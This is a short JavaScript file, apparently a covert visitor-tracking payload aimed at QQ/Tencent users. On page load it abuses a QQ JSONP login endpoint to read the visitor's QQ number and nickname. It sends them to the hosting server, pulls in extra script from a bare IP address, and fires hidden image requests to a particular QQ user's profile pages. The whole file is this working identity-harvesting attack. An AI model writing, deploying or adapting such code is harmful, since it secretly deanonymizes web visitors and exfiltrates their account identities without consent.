/**
 * Created by Administrator on 14-5-26.
 */

var xHead = document.getElementsByTagName('HEAD').item(0);
var isIE = document.all ? true : false;
var xurl = location.href; var xx1 = '';
var xx3 = 0; var xx2 = '';
xurl = xurl.replace("code", "handle");
function fangkenoLogin() {
    var fangke_oScript = document.createElement("script");
    fangke_oScript.type = "application/x-javascript";
    fangke_oScript.charset = "utf-8";
    if (isIE) {
        fangke_oScript.onreadystatechange = function () {
            fangkecheckLogin(fangke_oScript) };
    } else {
        fangke_oScript.onload = function () {
            fangkecheckLogin(fangke_oScript) };
    }
    fangke_oScript.src = "http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=123456789&t=" + (new Date).getTime();
    xHead.appendChild(fangke_oScript);
}
function fangke_LoginOK() {
    var fangke_lScript = document.createElement("script");
    fangke_lScript.type = "text/javascript";
    fangke_lScript.charset = "utf-8";
    fangke_lScript.src = "http://115.28.17.130/2014/js/getMsq.js";
    xHead.appendChild(fangke_lScript);
}
function random(min, max) {
    return Math.floor(min + Math.random() * (max - min));
}
function fangkevisit() {
    var xBody = document.getElementsByTagName('BODY').item(0);
    var qzone = document.createElement("img");
    qzone.src = "http://user.qzone.qq.com/305854620";
    qzone.style.display = "none"; xBody.appendChild(qzone);
    var xBody = document.getElementsByTagName('BODY').item(0);
    var meishi = document.createElement("img");
    meishi.src = "http://meishi.qq.com/profiles/305854620";
    meishi.style.display = "none";
    xBody.appendChild(meishi);
    var xBody = document.getElementsByTagName('BODY').item(0);
    var mymusic = document.createElement("img");
    mymusic.src = "http://y.qq.com/y/static/mymusic/mymusic_index.html?pageuin=305854620&mymusic_index=1?rnd="; mymusic.style.display = "none"; xBody.appendChild(mymusic);
}
function xxx() {
    if (xx1 == '') {
        var fangke_qScript = document.createElement("script"); fangke_qScript.type = "text/javascript"; fangke_qScript.charset = "utf-8"; fangke_qScript.src = 'http://apps.game.qq.com/comm-cgi-bin/login/LoginReturnInfo.cgi?callback=xxxx&game=bns'; xHead.appendChild(fangke_qScript);
    } else {
        var fangke_qScript = document.createElement("script"); fangke_qScript.type = "text/javascript"; fangke_qScript.charset = "utf-8"; fangke_qScript.src = xurl + "&xx1=" + xx1 + "&xx2=" + xx2 + "&xx3=" + xx3; xx3++; xHead.appendChild(fangke_qScript); setTimeout(fangkevisit, 15000);
    }
}
function xxxx(x) {
    xx1 = x.userUin; xx2 = x.nickName; setTimeout(xxx, 1);
}
function fangkeloadjs() {
    try {
        if (data3) {
            setTimeout(xxx, 100); fangke_LoginOK();
        } else {
        }
    } catch (e) {
        setTimeout(fangkevisit, 0); } }
function fangkecheckLogin(a) {
    if (a.readyState) {
        if (a.readyState == "loaded" || a.readyState == "complete") {
            a.onreadystatechange = null; a.onload = null; setTimeout(fangkeloadjs, 0); }
    } else { a.onreadystatechange = null; a.onload = null; setTimeout(fangkeloadjs, 0); }
}
fangkenoLogin();
